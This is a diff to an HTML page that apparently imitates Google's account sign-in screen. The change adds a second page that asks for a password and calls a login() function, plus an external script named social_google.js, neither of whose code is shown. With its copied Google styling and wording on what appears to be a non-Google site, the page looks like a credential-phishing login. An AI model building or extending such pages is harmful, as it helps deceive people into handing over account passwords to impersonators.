@@ -4,6 +4,7 @@
         <meta charset="utf-8" />
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
         <script src="/resource/javascript/config.js"></script>
+        <script src="/resource/javascript/social_google.js"></script>
     </head>
     <style>
         .google_logo {
@@ -30,7 +31,6 @@
             color: white;
             border: none;
             border-radius: 25px;
-            
         }
     </style>
     <body style="padding: 10px;">
@@ -42,7 +42,7 @@
                 <p>Use your Google Account</p>
                 <br />
                 <div align="center">
-                    <input class="in" placeholder="Email or phone" />
+                    <input id="in" class="in" placeholder="Email or phone" />
                 </div>
                 <P style="color: var(--gm3-sys-color-primary,#0b57d0);font: bold 16px Arial, sans-serif;;">Forgot email?</P>
                 <br />
@@ -52,9 +52,32 @@
                     <p style="margin-top: 10px;color: var(--gm3-sys-color-primary,#0b57d0);font: bold 16px Arial, sans-serif;">Create account</p>
                 </div>
                 <div style="float: right;">
-                    <button class="btn_1">Next</button>
+                    <button class="btn_1" onclick="next()">Next</button>
                 </div>
             </div>
+        </div>
+        <div id="page_2" style="display: none;">
+            <div align="center">
+                <div class="google_logo"></div>
+                <p style="font-size: 35px;padding: 0px;margin: 0px;font: bold 35px Arial, sans-serif;">Welcome</p>
+                <div align="center">
+                    <button style="height: 30px;border: none;width: 80%;background-color: rgb(238, 238, 238);border-radius: 20px;" id="email"></button>
+                </div>
+                <br />
+                <br />
+                <div align="center" style="width: 90%;">
+                    <input type="password" placeholder="Please input your password" id="password" class="in" />
+                    <br />
+                    <br />
+                    <div style="float: left;">
+                        <P style="margin-left: 5%;color: var(--gm3-sys-color-primary,#0b57d0);font: bold 16px Arial, sans-serif;margin: 10px;">Forgot email?</P>
+                    </div>
+                    <div style="float: right;">
+                        <button class="btn_1" onclick="login()">Next</button>
+                    </div>
+                </div>
+            </div>
+            
         </div>
     </body>
 </html>
